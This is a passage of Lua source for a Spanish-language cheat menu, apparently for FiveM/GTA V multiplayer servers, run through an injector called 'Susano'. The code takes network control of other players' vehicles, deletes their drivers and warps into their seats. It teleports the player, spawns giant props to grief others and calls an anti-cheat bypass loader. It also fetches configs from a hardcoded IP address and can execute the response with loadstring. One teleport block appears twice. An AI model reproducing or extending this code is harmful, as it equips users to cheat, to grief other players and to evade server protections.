                            local getUrl = baseUrl .. "/config/save?data=" .. encodedData
                            local status, response = Susano.HttpGet(getUrl)

                            if status == 200 then

                            else
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "Fallo al guardar la configuracion. Estado: " .. tostring(status), function() end)
                                end
                            end
                        else
                            if Menu and Menu.OpenInput then
                                Menu.OpenInput("Error", "Funciones HTTP no disponibles", function() end)
                            end
                        end
                    end)
                end)
            end
        end
    end

    Actions.loadConfigItem = FindItem("Ajustes", "Configuracion", "Cargar configuracion")
    if Actions.loadConfigItem then
        Actions.loadConfigItem.onClick = function()
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Cargar configuracion", "Introduce el codigo de la configuracion:", function(code)
                    if not code or code == "" then return end

                    code = string.lower(string.gsub(code, "%s+", ""))

                    if type(Susano) == "table" and type(Susano.HttpGet) == "function" then
                        CreateThread(function()
                            local status, response = Susano.HttpGet("http://82.22.7.19:25010/config/load?code=" .. code)

                            if status == 200 and response then
                                if type(response) ~= "string" then
                                    response = tostring(response)
                                end

                                local success, data, parseErr = pcall(function()
                                    if json and type(json.decode) == "function" then
                                        return json.decode(response)
                                    elseif loadstring then
                                        local func = loadstring("return " .. response)
                                        if func then
                                            return func()
                                        end
                                    end
                                    return nil
                                end)

                                if not success then
                                    parseErr = data
                                    data = nil
                                end

                                if success and data then
                                    local configToApply = data.config or data
                                    if configToApply and type(configToApply) == "table" then

                                        Wait(100)

                                        if not Menu or not Menu.Categories then
                                            if Menu and Menu.OpenInput then
                                                Menu.OpenInput("Error", "Menu no listo. Por favor, intentelo de nuevo.", function() end)
                                            end
                                            return
                                        end

                                        local applySuccess, applyErr = pcall(function()
                                            ApplyConfig(configToApply)
                                        end)

                                        if applySuccess then

                                        else
                                            print("Error en ApplyConfig: " .. tostring(applyErr))
                                            if Menu and Menu.OpenInput then
                                                Menu.OpenInput("Error", "Fallo al aplicar la configuracion: " .. tostring(applyErr), function() end)
                                            end
                                        end
                                    else
                                        print("Formato de configuracion invalido. Tipo: " .. type(configToApply))
                                        if Menu and Menu.OpenInput then
                                            Menu.OpenInput("Error", "Formato de configuracion invalido", function() end)
                                        end
                                    end
                                else
                                    print("Error de parseo: " .. tostring(parseErr) .. " | Respuesta: " .. tostring(string.sub(response or "", 1, 100)))
                                    if Menu and Menu.OpenInput then
                                        Menu.OpenInput("Error", "Fallo al parsear la configuracion: " .. tostring(parseErr or "Error desconocido"), function() end)
                                    end
                                end
                            elseif status == 404 then
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "¡Configuracion no encontrada!", function() end)
                                end
                            else
                                if Menu and Menu.OpenInput then
                                    Menu.OpenInput("Error", "Fallo al cargar la configuracion. Estado: " .. tostring(status), function() end)
                                end
                            end
                        end)
                    end
                end)
            end
        end
    end

end

CreateThread(function()
    while true do
        local pool = {}
        if GetGamePool then
            pool = GetGamePool('CVehicle')
        else
            local handle, veh = FindFirstVehicle()
            if handle ~= -1 then
                repeat
                    table.insert(pool, veh)
                    found, veh = FindNextVehicle(handle)
                until not found
                EndFindVehicle(handle)
            end
        end

        local pPed = PlayerPedId()
        local pCoords = GetEntityCoords(pPed)
        local temp = {}

        for _, veh in ipairs(pool) do
            if DoesEntityExist(veh) and veh ~= GetVehiclePedIsIn(pPed, false) then
                local vCoords = GetEntityCoords(veh)
                local dist = #(pCoords - vCoords)
                if dist < 300.0 then
                    local model = GetEntityModel(veh)
                    local name = GetDisplayNameFromVehicleModel(model)
                    local label = GetLabelText(name)
                    if label ~= "NULL" then name = label end
                    table.insert(temp, {entity = veh, name = name, coords = vCoords, dist = dist})
                end
            end
        end
        table.sort(temp, function(a, b) return a.dist < b.dist end)
        foundVehicles = temp

        local radarSelector = FindItem("Vehiculo", "Radar", "Seleccionar vehiculo")
        if radarSelector then
            local options = {}
            for _, vData in ipairs(foundVehicles) do
                table.insert(options, vData.name .. " [" .. math.floor(vData.dist) .. "m]")
            end
            if #options == 0 then options = {"Escaneando..."} end
            radarSelector.options = options
            if radarSelector.selected > #options then radarSelector.selected = 1 end
        end

        Wait(500)
    end
end)

local function DrawText3D(x, y, z, text)
    local onScreen, _x, _y = World3dToScreen2d(x, y, z)
    if onScreen then
        SetTextScale(0.35, 0.35)
        SetTextFont(4)
        SetTextProportional(1)
        SetTextColour(255, 255, 255, 215)
        SetTextEntry("STRING")
        SetTextCentre(1)
        AddTextComponentString(text)
        DrawText(_x, _y)
        local factor = (string.len(text)) / 370
        DrawRect(_x, _y + 0.0125, 0.015 + factor, 0.03, 41, 11, 41, 68)
    end
end

do
    local item = FindItem("Vehiculo", "Rendimiento", "Regalar vehiculo mas cercano")
    if item then
        item.onClick = function()
             local pPed = PlayerPedId()
            if #foundVehicles > 0 then
                local target = foundVehicles[1].entity
                if DoesEntityExist(target) then
                    local pCoords = GetEntityCoords(pPed)
                    local pHeading = GetEntityHeading(pPed)
                    local forward = GetEntityForwardVector(pPed)
                    local spawnPos = pCoords + (forward * 5.0)

                    NetworkRequestControlOfEntity(target)
                    local timeout = 0
                    while not NetworkHasControlOfEntity(target) and timeout < 20 do
                        NetworkRequestControlOfEntity(target)
                        Wait(50)
                        timeout = timeout + 1
                    end

                    SetEntityCoords(target, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false, false)
                    SetEntityHeading(target, pHeading)
                    PlaceObjectOnGroundProperly(target)
                else
                end
            else
            end
        end
    end
end

CreateThread(function()
    while true do
        Wait(0)
        local selector = FindItem("Vehiculo", "Radar", "Seleccionar vehiculo")
        local highlightToggle = FindItem("Vehiculo", "Radar", "Resaltar seleccionado")
        if selector and highlightToggle and highlightToggle.value and foundVehicles[selector.selected] then
            local vehicle = foundVehicles[selector.selected].entity
            if DoesEntityExist(vehicle) then
                local coords = GetEntityCoords(vehicle)
                local screenW, screenH = GetScreenSize()
                local onScreen, x, y = GetScreenCoordFromWorldCoord(coords.x, coords.y, coords.z)
                if onScreen then
                    DrawCircle(x * screenW, y * screenH, 20, 255, 255, 0, 255)
                end
            end
        end
    end
end)

CreateThread(function()
    local function RequestControl(entity, timeout)
        local t = 0
        while not NetworkHasControlOfEntity(entity) and t < timeout do
            NetworkRequestControlOfEntity(entity)
            Wait(10)
            t = t + 10
        end
        return NetworkHasControlOfEntity(entity)
    end

    while true do
        local sleep = 100

        if Menu.FOVWarp and Susano and Susano.GetAsyncKeyState and Susano.GetAsyncKeyState(0x58) then
            sleep = 0
            local playerPed = PlayerPedId()
            if not IsPedInAnyVehicle(playerPed, false) then
                local camCoords = GetGameplayCamCoord()
                local camRot = GetGameplayCamRot(2)

                local fwd = vector3(
                    -math.sin(math.rad(camRot.z)) * math.abs(math.cos(math.rad(camRot.x))),
                    math.cos(math.rad(camRot.z)) * math.abs(math.cos(math.rad(camRot.x))),
                    math.sin(math.rad(camRot.x))
                )

                local endCoords = camCoords + (fwd * 1000.0)

                local ray = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, endCoords.x, endCoords.y, endCoords.z, 2, playerPed, 0)
                local _, hit, hitCoords, surfaceNormal, entityHit = GetShapeTestResult(ray)

                if hit and entityHit and DoesEntityExist(entityHit) and IsEntityAVehicle(entityHit) then
                    local attempts = 0
                    while not NetworkHasControlOfEntity(entityHit) and attempts < 10 do
                        NetworkRequestControlOfEntity(entityHit)
                        Wait(10)
                        attempts = attempts + 1
                    end

                    local driver = GetPedInVehicleSeat(entityHit, -1)
                    if DoesEntityExist(driver) then
                        local maxSeats = GetVehicleMaxNumberOfPassengers(entityHit)
                        local freeSeat = nil
                        for i = 0, maxSeats - 1 do
                            if IsVehicleSeatFree(entityHit, i) then
                                freeSeat = i
                                break
                            end
                        end

                        if freeSeat then
                            SetPedIntoVehicle(playerPed, entityHit, freeSeat)
                            Wait(150)
                        end

                        NetworkRequestControlOfEntity(driver)
                        ClearPedTasksImmediately(driver)
                        SetEntityAsMissionEntity(driver, true, true)
                        SetEntityCoords(driver, 0.0, 0.0, -100.0, false, false, false, false)
                        Wait(50)
                        DeleteEntity(driver)

                        SetPedIntoVehicle(playerPed, entityHit, -1)
                    else
                        SetPedIntoVehicle(playerPed, entityHit, -1)
                    end

                    Wait(500)
                end
            end
        end

        if Menu.WarpPressW and Susano and Susano.GetAsyncKeyState and Susano.GetAsyncKeyState(0x57) then
            sleep = 0
            local playerPed = PlayerPedId()
            if IsPedInAnyVehicle(playerPed, false) then
                local vehicle = GetVehiclePedIsIn(playerPed, false)
                local drv = GetPedInVehicleSeat(vehicle, -1)

                if drv ~= 0 and drv ~= playerPed and DoesEntityExist(drv) then
                    Wait(150)

                    RequestControl(drv, 750)
                    ClearPedTasksImmediately(drv)
                    SetEntityAsMissionEntity(drv, true, true)
                    SetEntityCoords(drv, 0.0, 0.0, -100.0, false, false, false, false)
                    Wait(50)
                    DeleteEntity(drv)

                    SetPedIntoVehicle(playerPed, vehicle, -1)
                    Wait(500)
                end
                
                
                if DoesEntityExist(vehicle) then
                    local vehicleCoords = GetEntityCoords(vehicle)
                    local vehicleHeading = GetEntityHeading(vehicle)
                    
                    
                    local forwardX = -math.sin(math.rad(vehicleHeading))
                    local forwardY = math.cos(math.rad(vehicleHeading))
                    
                    
                    local warpDistance = 50.0
                    
                    
                    local newX = vehicleCoords.x + forwardX * warpDistance
                    local newY = vehicleCoords.y + forwardY * warpDistance
                    local newZ = vehicleCoords.z
                    
                    
                    SetEntityCoordsNoOffset(vehicle, newX, newY, newZ, false, false, false, false)
                    
                    
                    local numSeats = GetVehicleModelNumberOfSeats(GetEntityModel(vehicle))
                    if numSeats and numSeats > 0 then
                        for seat = -1, numSeats - 2 do
                            local passenger = GetPedInVehicleSeat(vehicle, seat)
                            if passenger ~= 0 and DoesEntityExist(passenger) and passenger ~= playerPed then
                                
                                if not IsPedInVehicle(passenger, vehicle, false) then
                                    SetPedIntoVehicle(passenger, vehicle, seat)
                                end
                            end
                        end
                    end
                    
                    Wait(100)
                end
            end
        end

        Wait(sleep)
    end
end)

Actions.keybindsPositionItem = FindItem("Ajustes", "Teclas rapidas", "Posicion de teclas rapidas")
if Actions.keybindsPositionItem then
    Actions.keybindsPositionItem.onClick = function(value)
        Menu.KeybindsPositionMode = value
    end
end

CreateThread(function()
    local keybindsX = 0.0
    local keybindsY = 0.0
    local moveSpeed = 0.001
    
    while true do
        Wait(0)
        
        if Menu.KeybindsPositionMode then
            local moved = false
            
            if IsControlPressed(0, 172) then
                keybindsY = keybindsY - moveSpeed
                moved = true
            end
            
            if IsControlPressed(0, 173) then
                keybindsY = keybindsY + moveSpeed
                moved = true
            end
            
            if IsControlPressed(0, 174) then
                keybindsX = keybindsX - moveSpeed
                moved = true
            end
            
            if IsControlPressed(0, 175) then
                keybindsX = keybindsX + moveSpeed
                moved = true
            end
            
            if moved then
                if type(Susano) == "table" and type(Susano.SetKeybindsPosition) == "function" then
                    Susano.SetKeybindsPosition(keybindsX, keybindsY)
                end
            end
        end
    end
end)



CreateThread(function()
    local baseWidth = 2560
    local baseHeight = 1080
    local currentScreenWidth = 0
    local currentScreenHeight = 0
    
    while true do
        Wait(1000)
        
        local screenWidth, screenHeight = GetActiveScreenResolution()
        
        if screenWidth ~= currentScreenWidth or screenHeight ~= currentScreenHeight then
            currentScreenWidth = screenWidth
            currentScreenHeight = screenHeight
            
            local scaleX = screenWidth / baseWidth
            local scaleY = screenHeight / baseHeight
            local scale = math.min(scaleX, scaleY)
            
            if type(Susano) == "table" and type(Susano.SetUIScale) == "function" then
                Susano.SetUIScale(scaleX, scaleY, scale)
            end
        end
    end
end)

Actions.teleportVisionItem = FindItem("Varios", "General", "Vision teletransporte")
if Actions.teleportVisionItem then
    local teleportVisionKey = nil
    local teleportVisionEnabled = false
    
    local keyNameToCode = {
        ["E"] = 38, ["F"] = 23, ["G"] = 47, ["X"] = 73, ["B"] = 29,
        ["V"] = 0, ["H"] = 74, ["Y"] = 246, ["U"] = 303, ["K"] = 311,
        ["N"] = 249, ["Q"] = 44, ["T"] = 245, ["R"] = 45, ["Z"] = 20,
        ["SPACE"] = 22, ["SHIFT"] = 21, ["CTRL"] = 36, ["ALT"] = 19,
        ["TAB"] = 37, ["CAPS"] = 137, ["ENTER"] = 18, ["BACKSPACE"] = 194,
        ["DELETE"] = 178, ["INSERT"] = 121, ["HOME"] = 213, ["END"] = 214,
        ["PAGEUP"] = 10, ["PAGEDOWN"] = 11,
        ["LEFT"] = 174, ["RIGHT"] = 175, ["UP"] = 172, ["DOWN"] = 173,
        ["F1"] = 288, ["F2"] = 289, ["F3"] = 170, ["F4"] = 166,
        ["F5"] = 167, ["F6"] = 168, ["F7"] = 169, ["F8"] = 56, ["F9"] = 57, ["F10"] = 58
    }
    
    Actions.teleportVisionItem.onClick = function(value)
        teleportVisionEnabled = value
        
        if value then
            if Menu and Menu.OpenInput then
                Menu.OpenInput("Vision teletransporte", "(E, F, X, B, V, etc.)", function(input)
                    if input and input ~= "" then
                        local keyUpper = input:upper()
                        
                        if keyNameToCode[keyUpper] then
                            teleportVisionKey = keyNameToCode[keyUpper]
                            
                            if type(Susano) == "table" and type(Susano.ShowNotification) == "function" then
                                Susano.ShowNotification("~g~¡Tecla registrada!~s~\nTecla: " .. keyUpper)
                            end
                        else
                            if type(Susano) == "table" and type(Susano.ShowNotification) == "function" then
                                Susano.ShowNotification("~r~¡Error!~s~\nTecla invalida: " .. input)
                            end
                            
                            teleportVisionEnabled = false
                            Actions.teleportVisionItem.value = false
                        end
                    else
                        teleportVisionEnabled = false
                        Actions.teleportVisionItem.value = false
                    end
                end)
            end
        end
    end
    
    CreateThread(function()
        local lastTeleport = 0
        
        while true do
            Wait(0)
            
            if teleportVisionEnabled and teleportVisionKey then
                
                local screenW, screenH = GetScreenSize()
                local centerX = screenW / 2
                local centerY = screenH / 2
                
                
                if Susano.DrawRectFilled then
                    
                    Susano.DrawRectFilled(centerX - 3, centerY - 3, 6, 6, 0.0, 0.0, 0.0, 1.0, 0)
                    
                    Susano.DrawRectFilled(centerX - 2, centerY - 2, 4, 4, 1.0, 1.0, 1.0, 1.0, 0)
                    
                    if Susano.SubmitFrame then
                        -- Frame handled by central loop
                    end
                elseif Susano.DrawLine then
                    
                    Susano.DrawLine(centerX - 4, centerY - 4, centerX + 4, centerY - 4, 0.0, 0.0, 0.0, 1.0, 2)
                    Susano.DrawLine(centerX - 4, centerY + 4, centerX + 4, centerY + 4, 0.0, 0.0, 0.0, 1.0, 2)
                    Susano.DrawLine(centerX - 4, centerY - 4, centerX - 4, centerY + 4, 0.0, 0.0, 0.0, 1.0, 2)
                    Susano.DrawLine(centerX + 4, centerY - 4, centerX + 4, centerY + 4, 0.0, 0.0, 0.0, 1.0, 2)
                    
                    Susano.DrawLine(centerX - 2, centerY - 2, centerX + 2, centerY - 2, 1.0, 1.0, 1.0, 1.0, 2)
                    Susano.DrawLine(centerX - 2, centerY + 2, centerX + 2, centerY + 2, 1.0, 1.0, 1.0, 1.0, 2)
                    Susano.DrawLine(centerX - 2, centerY - 2, centerX - 2, centerY + 2, 1.0, 1.0, 1.0, 1.0, 2)
                    Susano.DrawLine(centerX + 2, centerY - 2, centerX + 2, centerY + 2, 1.0, 1.0, 1.0, 1.0, 2)
                   
                    if Susano.SubmitFrame then
                        -- Frame handled by central loop
                    end
                end
                
                local shouldTeleport = false
                
                if IsControlJustPressed(0, teleportVisionKey) then
                    shouldTeleport = true
                end
                
                if type(Susano) == "table" and type(Susano.GetAsyncKeyState) == "function" then
                    if Susano.GetAsyncKeyState(teleportVisionKey) and (GetGameTimer() - lastTeleport) > 300 then
                        shouldTeleport = true
                    end
                end
                
                if shouldTeleport then
                    lastTeleport = GetGameTimer()
                    local ped = PlayerPedId()
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    
                    local pitch = math.rad(camRot.x)
                    local yaw = math.rad(camRot.z)
                    
                    local dirX = -math.sin(yaw) * math.cos(pitch)
                    local dirY = math.cos(yaw) * math.cos(pitch)
                    local dirZ = math.sin(pitch)
                    
                    local raycastStart = camCoords
                    local raycastEnd = vector3(
                        camCoords.x + dirX * 1000.0,
                        camCoords.y + dirY * 1000.0,
                        camCoords.z + dirZ * 1000.0
                    )
                    
                    local raycast = StartExpensiveSynchronousShapeTestLosProbe(
                        raycastStart.x, raycastStart.y, raycastStart.z,
                        raycastEnd.x, raycastEnd.y, raycastEnd.z,
                        -1, ped, 7
                    )
                    
                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(raycast)
                    
                    if hit then
                        
                        if entityHit and DoesEntityExist(entityHit) and IsEntityAVehicle(entityHit) then
                            
                            local maxSeats = GetVehicleMaxNumberOfPassengers(entityHit)
                            local vehicleDriver = GetPedInVehicleSeat(entityHit, -1)
                            
                            
                            local seatFound = false
                            
                            
                            if not vehicleDriver or vehicleDriver == 0 then
                                TaskWarpPedIntoVehicle(ped, entityHit, -1)
                                seatFound = true
                            else
                                
                                for i = 0, maxSeats - 1 do
                                    if IsVehicleSeatFree(entityHit, i) then
                                        TaskWarpPedIntoVehicle(ped, entityHit, i)
                                        seatFound = true
                                        break
                                    end
                                end
                            end
                            
                            
                            if not seatFound then
                                SetEntityCoordsNoOffset(ped, endCoords.x, endCoords.y, endCoords.z, false, false, false)
                            end
                        else
                            
                            SetEntityCoordsNoOffset(ped, endCoords.x, endCoords.y, endCoords.z, false, false, false)
                        end
                    else
                        SetEntityCoordsNoOffset(ped, raycastEnd.x, raycastEnd.y, raycastEnd.z, false, false, false)
                    end
                end
            end
        end
    end)
end


Actions.teleportShootItem = FindItem("Varios", "General", "Disparo teletransporte")
if Actions.teleportShootItem then
    local teleportShootEnabled = false
    
    Actions.teleportShootItem.onClick = function(value)
        teleportShootEnabled = value
        
        if value then
            if type(Susano) == "table" and type(Susano.ShowNotification) == "function" then
                Susano.ShowNotification("~g~Disparo teletransporte activado~s~\n¡Dispara para teletransportarte!")
            end
        end
    end
    
    CreateThread(function()
        local lastTeleportShoot = 0
        
        while true do
            Wait(0)
            
            if teleportShootEnabled then
                
                local screenW, screenH = GetScreenSize()
                local centerX = screenW / 2
                local centerY = screenH / 2
                
                
                if Susano.DrawRectFilled then
                   
                    Susano.DrawRectFilled(centerX - 3, centerY - 3, 6, 6, 0.0, 0.0, 0.0, 1.0, 0)
                    
                    Susano.DrawRectFilled(centerX - 2, centerY - 2, 4, 4, 1.0, 1.0, 1.0, 1.0, 0)
                    
                    if Susano.SubmitFrame then
                        -- Frame handled by central loop
                    end
                elseif Susano.DrawLine then
                    
                    Susano.DrawLine(centerX - 4, centerY - 4, centerX + 4, centerY - 4, 0.0, 0.0, 0.0, 1.0, 2)
                    Susano.DrawLine(centerX - 4, centerY + 4, centerX + 4, centerY + 4, 0.0, 0.0, 0.0, 1.0, 2)
                    Susano.DrawLine(centerX - 4, centerY - 4, centerX - 4, centerY + 4, 0.0, 0.0, 0.0, 1.0, 2)
                    Susano.DrawLine(centerX + 4, centerY - 4, centerX + 4, centerY + 4, 0.0, 0.0, 0.0, 1.0, 2)
                    
                    Susano.DrawLine(centerX - 2, centerY - 2, centerX + 2, centerY - 2, 1.0, 1.0, 1.0, 1.0, 2)
                    Susano.DrawLine(centerX - 2, centerY + 2, centerX + 2, centerY + 2, 1.0, 1.0, 1.0, 1.0, 2)
                    Susano.DrawLine(centerX - 2, centerY - 2, centerX - 2, centerY + 2, 1.0, 1.0, 1.0, 1.0, 2)
                    Susano.DrawLine(centerX + 2, centerY - 2, centerX + 2, centerY + 2, 1.0, 1.0, 1.0, 1.0, 2)
                    
                    if Susano.SubmitFrame then
                        -- Frame handled by central loop
                    end
                end
                
               
                local ped = PlayerPedId()
                if IsPedShooting(ped) and (GetGameTimer() - lastTeleportShoot) > 100 then
                    lastTeleportShoot = GetGameTimer()
                    
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    
                    local pitch = math.rad(camRot.x)
                    local yaw = math.rad(camRot.z)
                    
                    local dirX = -math.sin(yaw) * math.cos(pitch)
                    local dirY = math.cos(yaw) * math.cos(pitch)
                    local dirZ = math.sin(pitch)
                    
                    local raycastStart = camCoords
                    local raycastEnd = vector3(
                        camCoords.x + dirX * 1000.0,
                        camCoords.y + dirY * 1000.0,
                        camCoords.z + dirZ * 1000.0
                    )
                    
                    local raycast = StartExpensiveSynchronousShapeTestLosProbe(
                        raycastStart.x, raycastStart.y, raycastStart.z,
                        raycastEnd.x, raycastEnd.y, raycastEnd.z,
                        -1, ped, 7
                    )
                    
                    local _, hit, endCoords, _, entityHit = GetShapeTestResult(raycast)
                    
                    if hit then
                       
                        if entityHit and DoesEntityExist(entityHit) and IsEntityAVehicle(entityHit) then
                           
                            local maxSeats = GetVehicleMaxNumberOfPassengers(entityHit)
                            local vehicleDriver = GetPedInVehicleSeat(entityHit, -1)
                            
                            
                            local seatFound = false
                            
                            
                            if not vehicleDriver or vehicleDriver == 0 then
                                TaskWarpPedIntoVehicle(ped, entityHit, -1)
                                seatFound = true
                            else
                                
                                for i = 0, maxSeats - 1 do
                                    if IsVehicleSeatFree(entityHit, i) then
                                        TaskWarpPedIntoVehicle(ped, entityHit, i)
                                        seatFound = true
                                        break
                                    end
                                end
                            end
                            
                            
                            if not seatFound then
                                SetEntityCoordsNoOffset(ped, endCoords.x, endCoords.y, endCoords.z, false, false, false)
                            end
                        else
                            
                            SetEntityCoordsNoOffset(ped, endCoords.x, endCoords.y, endCoords.z, false, false, false)
                        end
                    else
                        SetEntityCoordsNoOffset(ped, raycastEnd.x, raycastEnd.y, raycastEnd.z, false, false, false)
                    end
                end
            end
        end
    end)
end


Actions.teleportShootItem = FindItem("Varios", "General", "Disparo teletransporte")
if Actions.teleportShootItem then
    local teleportShootEnabled = false
    
    Actions.teleportShootItem.onClick = function(value)
        teleportShootEnabled = value
    end
    
    CreateThread(function()
        while true do
            Wait(0)
            
            if teleportShootEnabled then
                local ped = PlayerPedId()
                
                
                if IsPedShooting(ped) then
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    
                    local pitch = math.rad(camRot.x)
                    local yaw = math.rad(camRot.z)
                    
                    local dirX = -math.sin(yaw) * math.cos(pitch)
                    local dirY = math.cos(yaw) * math.cos(pitch)
                    local dirZ = math.sin(pitch)
                    
                    local raycastStart = camCoords
                    local raycastEnd = vector3(
                        camCoords.x + dirX * 1000.0,
                        camCoords.y + dirY * 1000.0,
                        camCoords.z + dirZ * 1000.0
                    )
                    
                    local raycast = StartExpensiveSynchronousShapeTestLosProbe(
                        raycastStart.x, raycastStart.y, raycastStart.z,
                        raycastEnd.x, raycastEnd.y, raycastEnd.z,
                        -1, ped, 7
                    )
                    
                    local _, hit, endCoords, _, _ = GetShapeTestResult(raycast)
                    
                    if hit then
                        
                        SetEntityCoordsNoOffset(ped, endCoords.x, endCoords.y, endCoords.z, false, false, false)
                    else
                        
                        SetEntityCoordsNoOffset(ped, raycastEnd.x, raycastEnd.y, raycastEnd.z, false, false, false)
                    end
                    
                    
                    Wait(100)
                end
            end
        end
    end)
end


Citizen.CreateThread(function()
    local blossomActive = false
    local ptfxLoaded = false

    while true do
        Citizen.Wait(0)

        if Menu.ShowBlossoms and not blossomActive then
            
            RequestNamedPtfxAsset("core")
            while not HasNamedPtfxAssetLoaded("core") do
                Citizen.Wait(0)
            end
            UseParticleFxAssetNextCall("core")
            ptfxLoaded = true
            blossomActive = true
        end

        if Menu.ShowBlossoms and ptfxLoaded then
            
            local playerPed = PlayerPedId()
            local coords = GetEntityCoords(playerPed)

            
            for i = 1, 3 do
                local offsetX = math.random(-100, 100) / 10.0
                local offsetY = math.random(-100, 100) / 10.0
                local offsetZ = math.random(20, 50) / 10.0
                StartParticleFxNonLoopedAtCoord("ent_amb_animal_blossoms", 
                    coords.x + offsetX, coords.y + offsetY, coords.z + offsetZ,
                    0.0, 0.0, 0.0, 1.0, false, false, false)
            end
        end

        if not Menu.ShowBlossoms and blossomActive then
            
            RemoveNamedPtfxAsset("core")
            ptfxLoaded = false
            blossomActive = false
        end
    end
end)

LoadBypasses()








-- ============================================================
-- SISTEMA DE FREECAM TOTALMENTE AISLADO PARA DESTROYER
-- ============================================================
local freecam_destroyer_active = false
local freecam_destroyer_just_started = false
local last_click_destroyer = 0
local last_scroll_destroyer = 0
local selected_destroyer_opt = 1
local scroll_offset_destroyer = 0

local d_cam_pos = vector3(0,0,0)
local d_cam_rot = vector3(0,0,0)
local d_normal_speed = 0.5
local d_fast_speed = 2.5

local DestroyerOptions = {
    "Teletransportar",
    "Spawn Rampa",
    "Asteroide Gigante",
    "Grua de Presa",
    "Plataforma Petrolifera",
    "Restos Submarino",
    "Molino Gigante",
    "Contenedor Pesado",
    "Torre Comms",
    "Barco Naufragado",
    "Contenedor Excavacion",
    "Grua de Portico"
}

local giantModels = {
    ["Asteroide Gigante"] = "prop_asteroid_01",
    ["Grua de Presa"] = "prop_dam_crane_01",
    ["Plataforma Petrolifera"] = "prop_oil_rig_01",
    ["Restos Submarino"] = "prop_sub_wreck_01",
    ["Molino Gigante"] = "prop_windmill_01",
    ["Contenedor Pesado"] = "prop_container_01a",
    ["Torre Comms"] = "prop_tower_fallback_01",
    ["Barco Naufragado"] = "prop_wrecked_ship_01",
    ["Contenedor Excavacion"] = "prop_big_dig_container",
    ["Grua de Portico"] = "prop_gantry_crane"
}

function UpdateDestroyerFreecam()
    if not freecam_destroyer_active then return end
    
    local forward = 0.0
    local sideways = 0.0
    local vertical = 0.0

    if Susano.GetAsyncKeyState(VK_W) then forward = 1.0 end
    if Susano.GetAsyncKeyState(VK_S) then forward = -1.0 end
    if Susano.GetAsyncKeyState(VK_D) then sideways = 1.0 end
    if Susano.GetAsyncKeyState(VK_A) then sideways = -1.0 end
    if Susano.GetAsyncKeyState(VK_SPACE) then vertical = 1.0 end
    if Susano.GetAsyncKeyState(VK_CONTROL) then vertical = -1.0 end

    local speed = Susano.GetAsyncKeyState(VK_SHIFT) and d_fast_speed or d_normal_speed
    local currentRot = GetGameplayCamRot(2)
    d_cam_rot = vector3(currentRot.x, currentRot.y, currentRot.z)

    local rad_pitch = math.rad(d_cam_rot.x)
    local rad_yaw = math.rad(d_cam_rot.z)

    d_cam_pos = vector3(
        d_cam_pos.x + forward * (-math.sin(rad_yaw)) * math.cos(rad_pitch) * speed,
        d_cam_pos.y + forward * (math.cos(rad_yaw)) * math.cos(rad_pitch) * speed,
        d_cam_pos.z + forward * (math.sin(rad_pitch)) * speed
    )
    d_cam_pos = vector3(
        d_cam_pos.x + sideways * (math.cos(rad_yaw)) * speed,
        d_cam_pos.y + sideways * (math.sin(rad_yaw)) * speed,
        d_cam_pos.z
    )
    d_cam_pos = vector3(d_cam_pos.x, d_cam_pos.y, d_cam_pos.z + vertical * speed)

    RequestCollisionAtCoord(d_cam_pos.x, d_cam_pos.y, d_cam_pos.z)
    SetFocusPosAndVel(d_cam_pos.x, d_cam_pos.y, d_cam_pos.z, 0.0, 0.0, 0.0)
    Susano.SetCameraPos(d_cam_pos.x, d_cam_pos.y, d_cam_pos.z)
end

function HandleDestroyerInput()
    if not freecam_destroyer_active then return end
    local time = GetGameTimer()
    if IsDisabledControlJustPressed(0, 241) and (time - last_scroll_destroyer) > 100 then
        selected_destroyer_opt = selected_destroyer_opt - 1
        if selected_destroyer_opt < 1 then selected_destroyer_opt = #DestroyerOptions end
        last_scroll_destroyer = time
    end
    if IsDisabledControlJustPressed(0, 242) and (time - last_scroll_destroyer) > 100 then
        selected_destroyer_opt = selected_destroyer_opt + 1
        if selected_destroyer_opt > #DestroyerOptions then selected_destroyer_opt = 1 end
        last_scroll_destroyer = time
    end
    if IsDisabledControlJustPressed(0, 24) and not freecam_destroyer_just_started and (time - last_click_destroyer) > 200 then
        local opt = DestroyerOptions[selected_destroyer_opt]
        local camCoords = d_cam_pos
        local camRot = d_cam_rot
        local dir = RotationToDirection(camRot)
        local target = camCoords + (dir * 50.0)
        
        local ray = StartShapeTestRay(camCoords.x, camCoords.y, camCoords.z, target.x, target.y, target.z, -1, PlayerPedId(), 0)
        local _, hit, coords = GetShapeTestResult(ray)
        local finalPos = hit == 1 and coords or target

        if opt == "Teletransportar" then
            SetEntityCoords(PlayerPedId(), finalPos.x, finalPos.y, finalPos.z, false, false, false, false)
        elseif opt == "Spawn Rampa" then
            spawnRampa(finalPos)
        elseif giantModels[opt] then
            spawnDestroyerProp(giantModels[opt], finalPos)
        end
        last_click_destroyer = time
    end
end

function DrawDestroyerFreecamMenu()
    if not freecam_destroyer_active then return end
    
    local sw, sh = GetActiveScreenResolution()
    local maxVis = 4
    if selected_destroyer_opt <= scroll_offset_destroyer then
        scroll_offset_destroyer = math.max(0, selected_destroyer_opt - 1)
    elseif selected_destroyer_opt > scroll_offset_destroyer + maxVis then
        scroll_offset_destroyer = selected_destroyer_opt - maxVis
    end
    local startY = sh - 150.0
    local centerX = sw / 2
    local indicator = string.format("%d / %d", selected_destroyer_opt, #DestroyerOptions)
    Susano.DrawText(centerX, startY - 25.0, indicator, 14.0, 1.0, 1.0, 1.0, 1.0)
    for i = 1, maxVis do
        local idx = scroll_offset_destroyer + i
        if idx <= #DestroyerOptions then
            local isSel = (idx == selected_destroyer_opt)
            local r, g, b = isSel and 148/255 or 0.8, isSel and 0 or 0.8, isSel and 211/255 or 0.8
            Susano.DrawText(centerX - 50, startY + (i-1)*35, DestroyerOptions[idx], isSel and 24.0 or 18.0, r, g, b, 1.0)
        end
    end
end

function ToggleFreecamDestroyer(enable, speed)
    local ped = PlayerPedId()
    if enable then
        if IsPedInAnyVehicle(ped, false) then
            local item = FindItem("Destroyer", "General", "Freecam (Props)")
            if item then item.value = false end
